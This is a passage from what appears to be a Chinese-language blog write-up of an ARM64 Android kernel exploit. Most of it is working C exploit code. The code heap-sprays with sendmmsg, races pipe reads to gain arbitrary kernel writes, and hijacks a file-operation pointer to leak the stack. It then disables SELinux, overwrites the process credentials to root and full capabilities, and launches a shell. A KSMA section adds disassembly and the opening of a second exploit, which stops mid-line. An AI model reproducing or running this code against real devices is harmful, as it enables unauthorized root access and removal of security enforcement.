class="title">msg</span> =</span> &#123;&#123; <span class="number">0</span> &#125;, <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">    socketpair(AF_UNIX, SOCK_STREAM, <span class="number">0</span> , (<span class="keyword">int</span>*)&amp;sockfd);</span><br><span class="line"></span><br><span class="line">    msg.msg_hdr.msg_iov = sendmsg_iovec;</span><br><span class="line">    msg.msg_hdr.msg_iovlen = IOVEC_NUM;</span><br><span class="line">    msg.msg_hdr.msg_control = sendmsg_iovec;</span><br><span class="line">    msg.msg_hdr.msg_controllen = (IOVEC_NUM * <span class="keyword">sizeof</span>(struct iovec)); <span class="comment">// 都设置上，一次在内核中申请两个 kmalloc-8192</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(!stop_send)</span><br><span class="line">    &#123;</span><br><span class="line">        syscall(__NR_sendmmsg, sockfd.sock_a, &amp;msg, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    close(sockfd.sock_a);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">heapspray</span><span class="params">(<span class="keyword">void</span>* target_addr)</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">void</span>* retval;</span><br><span class="line">    <span class="keyword">pthread_t</span> msgthreads[SENDTHREADS];</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    sendmsg_iovec[(IOVEC_NUM / <span class="number">2</span>) + <span class="number">1</span>].iov_base = (<span class="keyword">void</span>*)&amp;overflowcheck;</span><br><span class="line">    sendmsg_iovec[(IOVEC_NUM / <span class="number">2</span>) + <span class="number">1</span>].iov_len = <span class="keyword">sizeof</span>(overflowcheck);</span><br><span class="line">    sendmsg_iovec[(IOVEC_NUM / <span class="number">2</span>) + <span class="number">2</span>].iov_base = target_addr;</span><br><span class="line">    sendmsg_iovec[(IOVEC_NUM / <span class="number">2</span>) + <span class="number">2</span>].iov_len = <span class="keyword">sizeof</span>(<span class="keyword">unsigned</span> <span class="keyword">long</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; SENDTHREADS; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(pthread_create(&amp;msgthreads[i], <span class="literal">NULL</span>, writemsg, <span class="literal">NULL</span>)) err(<span class="number">1</span>, <span class="string">&quot;heapspray pthread_create()&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">2</span>);</span><br><span class="line">    stop_send = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; SENDTHREADS; i++)</span><br><span class="line">        pthread_join(msgthreads[i], &amp;retval);</span><br><span class="line">    stop_send = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">aaw</span><span class="params">(<span class="keyword">void</span>* target_addr, <span class="keyword">unsigned</span> <span class="keyword">long</span> targetval)</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">pthread_t</span> mapthread, wthread, rthread;</span><br><span class="line"></span><br><span class="line">    kill_switch = <span class="number">0</span>;</span><br><span class="line">    overflowcheck = MEMMAGIC;                <span class="comment">// 多次使用，需重新初始化</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;    [+] Start map/unmap thread\\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>((ret = pthread_create(&amp;mapthread, <span class="literal">NULL</span>, mapunmap, <span class="literal">NULL</span>))) err(<span class="number">1</span>, <span class="string">&quot;mapunmap pthread_create()&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;    [+] Start write thread\\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; (<span class="keyword">sizeof</span>(wbuf) / <span class="keyword">sizeof</span>(targetval)); i++)                <span class="comment">// 待写入的值</span></span><br><span class="line">        ((<span class="keyword">long</span>*)wbuf)[i] = targetval;</span><br><span class="line">    <span class="keyword">if</span>((ret = pthread_create(&amp;wthread, <span class="literal">NULL</span>, writepipe, <span class="literal">NULL</span>))) err(<span class="number">1</span>, <span class="string">&quot;write pthread_create()&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// heap spray</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;    [+] start heap spray, waiting....\\n&quot;</span>);</span><br><span class="line">    heapspray(target_addr);            <span class="comment">// 指定待写的目标地址</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;    [+] Start read thread\\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>((ret = pthread_create(&amp;rthread, <span class="literal">NULL</span>, readpipe, <span class="literal">NULL</span>))) err(<span class="number">1</span>, <span class="string">&quot;read pthread_create()&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(overflowcheck != MEMMAGIC)</span><br><span class="line">        &#123;</span><br><span class="line">            kill_switch = <span class="number">1</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;    [+] Done write\\n&quot;</span>);</span><br><span class="line">            <span class="comment">// printf(&quot;     overflowcheck : 0x%llx, sizeof(overflowcheck): %d \\n&quot;, overflowcheck, sizeof(overflowcheck));</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// pthread_join(wthread,NULL);            // 有概率会卡住</span></span><br><span class="line">    pthread_join(mapthread,<span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(rthread,<span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">read_kernel</span><span class="params">(<span class="keyword">char</span>* k_addr, <span class="keyword">char</span>* u_addr)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> pipe_rw[<span class="number">2</span>];</span><br><span class="line">    pipe(pipe_rw);</span><br><span class="line">    write(pipe_rw[<span class="number">1</span>],(<span class="keyword">void</span>*)k_addr,<span class="number">0x8</span>);</span><br><span class="line">    read(pipe_rw[<span class="number">0</span>],(<span class="keyword">void</span>*)u_addr,<span class="number">0x8</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">write_kernel</span><span class="params">(<span class="keyword">char</span>* k_addr, <span class="keyword">char</span>* u_addr)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> pipe_rw[<span class="number">2</span>];</span><br><span class="line">    pipe(pipe_rw);</span><br><span class="line">    write(pipe_rw[<span class="number">1</span>],(<span class="keyword">void</span>*)u_addr,<span class="number">0x8</span>);</span><br><span class="line">    read(pipe_rw[<span class="number">0</span>],(<span class="keyword">void</span>*)k_addr,<span class="number">0x8</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">write_kernel4</span><span class="params">(<span class="keyword">char</span>* k_addr, <span class="keyword">char</span>* u_addr)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> pipe_rw[<span class="number">2</span>];</span><br><span class="line">    pipe(pipe_rw);</span><br><span class="line">    write(pipe_rw[<span class="number">1</span>],(<span class="keyword">void</span>*)u_addr,<span class="number">0x4</span>);</span><br><span class="line">    read(pipe_rw[<span class="number">0</span>],(<span class="keyword">void</span>*)k_addr,<span class="number">0x4</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    maximize_fd_limit();</span><br><span class="line">    setprocesspriority();             </span><br><span class="line"></span><br><span class="line"><span class="comment">// init global value</span></span><br><span class="line">    <span class="comment">/*mmap unmap addr*/</span></span><br><span class="line">    <span class="keyword">if</span>(mmap(MMAP_ADDR, MMAP_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_FIXED | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>) == (<span class="keyword">void</span>*)<span class="number">-1</span>) err(<span class="number">1</span>, <span class="string">&quot;mmap()&quot;</span>);</span><br><span class="line">    <span class="comment">/*readv iovec*/</span></span><br><span class="line">    pipe_iovec = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct iovec) * IOVEC_NUM);</span><br><span class="line">    <span class="built_in">memset</span>(pipe_iovec, <span class="number">0</span>, <span class="keyword">sizeof</span>(struct iovec) * IOVEC_NUM);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r_buf[<span class="number">2</span>];</span><br><span class="line">    pipe_iovec[<span class="number">0</span>].iov_base = r_buf;           <span class="comment">//just any buffer that is always available</span></span><br><span class="line">    pipe_iovec[<span class="number">0</span>].iov_len = <span class="keyword">sizeof</span>(<span class="keyword">long</span>) * <span class="number">2</span>;         <span class="comment">//how many bytes we can arbitrary write</span></span><br><span class="line">    pipe_iovec[<span class="number">1</span>].iov_base = MMAP_ADDR;</span><br><span class="line">    pipe_iovec[<span class="number">1</span>].iov_len = ((PAGE_SIZE * <span class="number">2</span>) - pipe_iovec[<span class="number">0</span>].iov_len);          <span class="comment">//we need more than one pipe buf so make a total of 2 pipe bufs (8192 bytes) </span></span><br><span class="line">    <span class="comment">/*heap spray - sendmsg iovec*/</span></span><br><span class="line">    sendmsg_iovec = <span class="built_in">malloc</span>(IOVEC_NUM*<span class="keyword">sizeof</span>(struct iovec));</span><br><span class="line">    <span class="built_in">memset</span>(sendmsg_iovec, <span class="number">0x0</span>, <span class="keyword">sizeof</span>(struct iovec) * IOVEC_NUM);</span><br><span class="line"></span><br><span class="line"><span class="comment">// init pipe_fd                        // 创建管道，并将其大小设置为 32*4096，防止读pipe时被阻塞</span></span><br><span class="line">    <span class="keyword">if</span>((ret = pipe(pipe_fd))) err(<span class="number">1</span>, <span class="string">&quot;pipe()&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(fcntl(pipe_fd[<span class="number">1</span>], F_SETPIPE_SZ, PIPESZ) != PIPESZ) err(<span class="number">1</span>, <span class="string">&quot;fcntl()&quot;</span>);    </span><br><span class="line"></span><br><span class="line"><span class="comment">// aaw test</span></span><br><span class="line">    <span class="comment">// unsigned long test = 0;</span></span><br><span class="line">    <span class="comment">// aaw(&amp;test, 0xffffaaaacccc);</span></span><br><span class="line">    <span class="comment">// printf(&quot;[+] test: 0x%llx\\n&quot;, test);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// exploit</span></span><br><span class="line">    <span class="comment">/*leak kernel sp*/</span></span><br><span class="line">    <span class="keyword">void</span>* check_flags_addr = (<span class="keyword">void</span>*)<span class="number">0xFFFFFFC0006F0FD0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> hijack_check_flags = <span class="number">0xffffffc00027ad14</span>;                <span class="comment">// ldr x1, [x0, #0x20] ; add x0, x29, #0x50 ; blr x1</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> sp_ret2usr = <span class="number">0xFFFFFFC00015EC34</span>;                        <span class="comment">//  CBNZ            W0, loc_FFFFFFC00015EA3C </span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span>* fake_x0;</span><br><span class="line">    <span class="keyword">if</span>((fake_x0 = mmap((<span class="keyword">void</span>*)((<span class="keyword">unsigned</span> <span class="keyword">long</span>)MMAP_ADDR + MMAP_SIZE), PAGE_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_FIXED | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>)) == (<span class="keyword">void</span>*)<span class="number">-1</span>) err(<span class="number">1</span>,<span class="string">&quot;mmap MMAP_ADDR + MMAP_SIZE&quot;</span>);</span><br><span class="line">    fake_x0[<span class="number">4</span>] = sp_ret2usr;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fake x0: 0x%lx\\n&quot;</span>,fake_x0);</span><br><span class="line"></span><br><span class="line">    aaw(check_flags_addr, hijack_check_flags);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> dev;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> kern_sp;</span><br><span class="line">    <span class="keyword">if</span>((dev = open(<span class="string">&quot;/dev/ptmx&quot;</span>,O_RDWR)) &lt; <span class="number">0</span>) err(<span class="number">1</span>, <span class="string">&quot;open /dev/ptmx&quot;</span>);</span><br><span class="line">    kern_sp = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)fcntl(dev, F_SETFL, fake_x0);</span><br><span class="line">    kern_sp += KERNEL_START;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;kernel sp: 0x%lx\\n&quot;</span>, kern_sp);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> thread_info_addr = kern_sp &amp; <span class="number">0xFFFFFFFFFFFFC000</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> addr_limit_addr = thread_info_addr + <span class="number">0x8</span>;</span><br><span class="line">    aaw((<span class="keyword">void</span>*)addr_limit_addr,<span class="number">0xfffffffffffffffc</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// pipe aaw test - set selinux_enforcing zero</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> user_data = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">void</span>* selinux_enforcing = <span class="number">0xFFFFFFC0006EBA0C</span>;</span><br><span class="line">    <span class="comment">// read_kernel(selinux_enforcing, &amp;user_data);</span></span><br><span class="line">    <span class="comment">// printf(&quot;before - selinux: 0x%lx\\n&quot;, user_data);</span></span><br><span class="line">    <span class="comment">// user_data = 0;</span></span><br><span class="line">    write_kernel4(selinux_enforcing, &amp;user_data);</span><br><span class="line">    <span class="comment">// read_kernel(selinux_enforcing, &amp;user_data);</span></span><br><span class="line">    <span class="comment">// printf(&quot;after - selinux: 0x%lx\\n&quot;, user_data);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// write cred</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> task_addr = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">void</span>* leak_task = thread_info_addr+<span class="number">0x10</span>;</span><br><span class="line">    read_kernel(leak_task, &amp;task_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;task_addr: 0x%lx\\n&quot;</span>, task_addr);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> cred_addr = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">void</span>* leak_cred = task_addr + <span class="number">0x3A0</span>;</span><br><span class="line">    read_kernel(leak_cred, &amp;cred_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;cred_addr: 0x%lx\\n&quot;</span>, cred_addr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> root_id = <span class="number">0</span>;    </span><br><span class="line">    write_kernel4((<span class="keyword">char</span>*)(cred_addr+<span class="number">4</span>), (<span class="keyword">char</span>*)&amp;root_id);</span><br><span class="line">    write_kernel4((<span class="keyword">char</span>*)(cred_addr+<span class="number">8</span>), (<span class="keyword">char</span>*)&amp;root_id);</span><br><span class="line">    write_kernel4((<span class="keyword">char</span>*)(cred_addr+<span class="number">12</span>), (<span class="keyword">char</span>*)&amp;root_id);</span><br><span class="line">    write_kernel4((<span class="keyword">char</span>*)(cred_addr+<span class="number">16</span>), (<span class="keyword">char</span>*)&amp;root_id);</span><br><span class="line">    write_kernel4((<span class="keyword">char</span>*)(cred_addr+<span class="number">20</span>), (<span class="keyword">char</span>*)&amp;root_id);</span><br><span class="line">    write_kernel4((<span class="keyword">char</span>*)(cred_addr+<span class="number">24</span>), (<span class="keyword">char</span>*)&amp;root_id);</span><br><span class="line">    write_kernel4((<span class="keyword">char</span>*)(cred_addr+<span class="number">28</span>), (<span class="keyword">char</span>*)&amp;root_id);</span><br><span class="line">    write_kernel4((<span class="keyword">char</span>*)(cred_addr+<span class="number">32</span>), (<span class="keyword">char</span>*)&amp;root_id);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> root_cap = <span class="number">0xffffffffffffffff</span>;</span><br><span class="line">    write_kernel((<span class="keyword">char</span>*)cred_addr+<span class="number">0x28</span>, (<span class="keyword">char</span>*)&amp;root_cap);</span><br><span class="line">    write_kernel((<span class="keyword">char</span>*)cred_addr+<span class="number">0x30</span>, (<span class="keyword">char</span>*)&amp;root_cap);</span><br><span class="line">    write_kernel((<span class="keyword">char</span>*)cred_addr+<span class="number">0x38</span>, (<span class="keyword">char</span>*)&amp;root_cap);</span><br><span class="line">    write_kernel((<span class="keyword">char</span>*)cred_addr+<span class="number">0x40</span>, (<span class="keyword">char</span>*)&amp;root_cap);</span><br><span class="line">    write_kernel((<span class="keyword">char</span>*)cred_addr+<span class="number">0x48</span>, (<span class="keyword">char</span>*)&amp;root_cap);</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;/system/bin/sh&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;exit...should never be there\\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
<p>执行效果：</p>
<p><img   src="image-20231113015835988.png?size=600" style="width: 600px;"  alt="image-20231113015835988"></p>

        <h2 id="KSMA"   >
          <a href="#KSMA" class="heading-link"><i class="fas fa-link"></i></a><a href="#KSMA" class="headerlink" title="KSMA"></a>KSMA</h2>
      <ol>
<li><p>如何找到一级页表对应的虚拟地址</p>
<p>bzImage恢复符号后，找到 init_mm.pgd，如下示例中 <code>0xFFFFFFC00007D000</code> 就是一级页表对应的虚拟地址</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.kernel:FFFFFFC0006A5AB0                 EXPORT init_mm</span><br><span class="line">.kernel:FFFFFFC0006A5AB0 init_mm         DCQ <span class="number">0</span>                   ; DATA XREF: show_pte:loc_FFFFFFC0000930AC↑o</span><br><span class="line">.kernel:FFFFFFC0006A5AB0                                         ; setup_mm_for_reboot+<span class="number">4</span>↑o ...</span><br><span class="line">.kernel:FFFFFFC0006A5AB8                 DCQ <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">.kernel:FFFFFFC0006A5AD0                 DCB <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">.kernel:FFFFFFC0006A5AD4 dword_FFFFFFC0006A5AD4 DCD <span class="number">0</span>            ; DATA XREF: .kernel:FFFFFFC0005DA5C8↑o</span><br><span class="line">.kernel:FFFFFFC0006A5AD8                 ALIGN <span class="number">0x40</span></span><br><span class="line">.kernel:FFFFFFC0006A5B00 off_FFFFFFC0006A5B00 DCQ <span class="number">0xFFFFFFC00007D000</span></span><br><span class="line">.kernel:FFFFFFC0006A5B00                                         ; DATA XREF: show_pte:loc_FFFFFFC000093054↑r</span><br><span class="line">.kernel:FFFFFFC0006A5B00                                         ; show_pte+<span class="number">34</span>↑r ...</span><br></pre></td></tr></table></div></figure>


</li>
</ol>
<p>该部分完整exp</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ksma.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/ip.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/uio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/resource.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/net.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOVEC_NUM 512</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PIPESZ (4096 * 32)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MEMMAGIC (0xDEADBEEF)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MMAP_ADDR ((void*)0x40000000)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MMAP_SIZE (PAGE_SIZE * 2)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SENDTHREADS (500)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KERNEL_START 0xffffffc000000000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KERNEL_IMAGE_VBASE 0xFFFFFFC000080000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">volatile</span> <span 